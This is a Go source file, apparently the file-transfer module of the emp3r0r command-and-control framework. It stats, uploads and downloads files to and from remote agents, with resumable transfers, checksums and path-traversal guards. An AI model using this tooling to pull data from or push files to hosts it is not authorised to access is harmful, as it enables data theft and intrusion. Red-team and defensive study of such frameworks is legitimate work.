package ftp

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/fxamacker/cbor/v2"
	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/network"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

type ExecCmdFunc func(string, string, string) error

// Inject this function to send command to agent
var ExecCmd ExecCmdFunc

// StatFile Get stat info of a file on agent
func StatFile(filepath string, a *def.Emp3r0rAgent) (fi *util.FileStat, err error) {
	cmd_id := uuid.NewString()
	cmd := fmt.Sprintf("%s --path '%s'", def.C2CmdStat, filepath)
	err = ExecCmd(cmd, cmd_id, a.Tag)
	if err != nil {
		return
	}
	var fileinfo util.FileStat

	defer func() {
		live.CmdResults.Delete(cmd_id)
	}()

	for {
		time.Sleep(100 * time.Millisecond)
		res, exists := live.CmdResults.Load(cmd_id)
		if exists {
			err = cbor.Unmarshal([]byte(res.(string)), &fileinfo)
			if err != nil {
				return
			}
			fi = &fileinfo
			break
		}
	}

	return
}

// PutFile put file to agent
func PutFile(lpath, rpath string, a *def.Emp3r0rAgent, saveToMemory bool) error {
	// file sha256sum
	logging.Infof("Calculating sha256sum of '%s'", lpath)
	sum := crypto.SHA256SumFile(lpath)
	// file size
	size := util.FileSize(lpath)
	sizemB := float32(size) / 1024 / 1024
	logging.Printf("\nPutFile:\nUploading '%s' to\n'%s' "+
		"on %s, agent [%s]\n"+
		"size: %d bytes (%.2fMB)\n"+
		"sha256sum: %s",
		lpath, rpath,
		a.From, a.Name,
		size, sizemB,
		sum,
	)

	// move file to wwwroot, then move it back when we are done with it
	logging.Infof("Copying %s to %s", lpath, live.WWWRoot+util.FileBaseName(lpath))
	err := util.Copy(lpath, live.WWWRoot+util.FileBaseName(lpath))
	if err != nil {
		return fmt.Errorf("copy %s to %s: %v", lpath, live.WWWRoot+util.FileBaseName(lpath), err)
	}

	// send cmd
	cmd := fmt.Sprintf("put --file '%s' --path '%s' --checksum %s --size %d", lpath, rpath, sum, size)
	if saveToMemory {
		cmd += " --mem"
	}
	err = ExecCmd(cmd, "", a.Tag)
	if err != nil {
		return fmt.Errorf("PutFile send command: %v", err)
	}
	logging.Infof("Waiting for response from agent %s", a.Tag)
	return nil
}

// GenerateGetFilePaths generates paths and filenames for GetFile
func GenerateGetFilePaths(file_path string) (write_dir, save_to_file, tempname, lock string) {
	// We want to mirror the remote path structure locally.
	// But we must ensure it doesn't escape FileGetDir.
	// So we treat the remote absolute path as relative.

	// properties of the remote path
	// Use ToSlash to ensure consistent handling of separators
	cleanPath := filepath.ToSlash(filepath.Clean(file_path))

	// Strip absolute parts (drive letter and/or leading slash)
	// We want to treat the remote path as relative to our download directory
	relPath := cleanPath
	if vol := filepath.VolumeName(cleanPath); vol != "" {
		relPath = cleanPath[len(vol):]
	}
	relPath = strings.TrimLeft(relPath, "/")

	// Use SecureLocalPath to ensure the path is safe (no ../)
	// It now supports native paths and internally handles separator normalization
	localized, err := util.SecureLocalPath(relPath)
	if err != nil {
		logging.Debugf("GenerateGetFilePaths: unsafe path %q: %v. Using basename only.", file_path, err)
		localized = filepath.Base(cleanPath) // fallback to just filename
	}

	write_dir = filepath.Join(live.FileGetDir, filepath.Dir(localized))
	save_to_file = filepath.Join(write_dir, filepath.Base(localized))
	tempname = save_to_file + ".tmp"
	lock = save_to_file + ".lock"
	return
}

// GetFile get file from agent
func GetFile(file_path string, agent *def.Emp3r0rAgent) (ftpSh *network.StreamHandler, err error) {
	logging.Infof("Waiting for response from agent %s", agent.Tag)

	write_dir, save_to_file, tempname, lock := GenerateGetFilePaths(file_path)
	logging.Debugf("Get file: %s, save to: %s, tempname: %s, lock: %s", file_path, save_to_file, tempname, lock)

	// create directories
	if !util.IsDirExist(write_dir) {
		logging.Infof("Creating directory: %s", strconv.Quote(write_dir))
		err = os.MkdirAll(write_dir, 0o700)
		if err != nil {
			err = fmt.Errorf("GetFile mkdir %s: %v", write_dir, err)
			return
		}
	}

	// is this file already being downloaded?
	if util.IsExist(lock) {
		err = fmt.Errorf("%s is already being downloaded", save_to_file)
		return
	}

	// stat target file, know its size, and allocate the file on disk
	fi, err := StatFile(file_path, agent)
	if err != nil {
		err = fmt.Errorf("GetFile: failed to stat %s: %v", file_path, err)
		return
	}
	fileinfo := *fi
	filesize := fileinfo.Size
	// check if file exists
	if util.IsExist(save_to_file) {
		checksum := crypto.SHA256SumFile(save_to_file)
		if checksum == fileinfo.Checksum {
			logging.Successf("%s already exists, checksum matched", save_to_file)
			return
		} else {
			logging.Warningf("%s already exists, but checksum mismatched", save_to_file)
		}
	}

	err = util.FileAllocate(save_to_file, filesize)
	if err != nil {
		err = fmt.Errorf("GetFile: %s allocate file: %v", file_path, err)
		return
	}
	logging.Printf("We will be downloading %s, %d bytes in total (%s)", file_path, filesize, fileinfo.Checksum)

	// what if we have downloaded part of the file
	var offset int64 = 0
	if util.IsExist(tempname) {
		fiHave := util.FileSize(tempname)
		offset = fiHave
	}

	// mark this file transfer stream
	ftpSh = &network.StreamHandler{}
	// tell agent where to seek the left bytes
	ftpSh.Token = fmt.Sprintf("%s-%s", util.RandMD5String(), fileinfo.Checksum)
	ftpSh.Buf = make(chan []byte)
	ftpSh.BufSize = 1024 * 8
	network.FTPMutex.Lock()
	network.FTPStreams[file_path] = ftpSh
	network.FTPMutex.Unlock()

	// h2x
	ftpSh.H2x = new(def.H2Conn)

	// cmd
	cmd := fmt.Sprintf("get --file_path '%s' --offset %d --token '%s'", file_path, offset, ftpSh.Token)
	err = ExecCmd(cmd, "", agent.Tag)
	if err != nil {
		logging.Errorf("GetFile send command: %v", err)
		return nil, err
	}

	return ftpSh, nil
}

// DownloadFile download file from URL
func DownloadFile(url string, filepath string) error {
	// Create the HTTP request
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	// Check server response
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("bad status: %s", resp.Status)
	}

	// Create the file
	out, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer out.Close()

	// Write the body to file
	_, err = io.Copy(out, resp.Body)
	return err
}
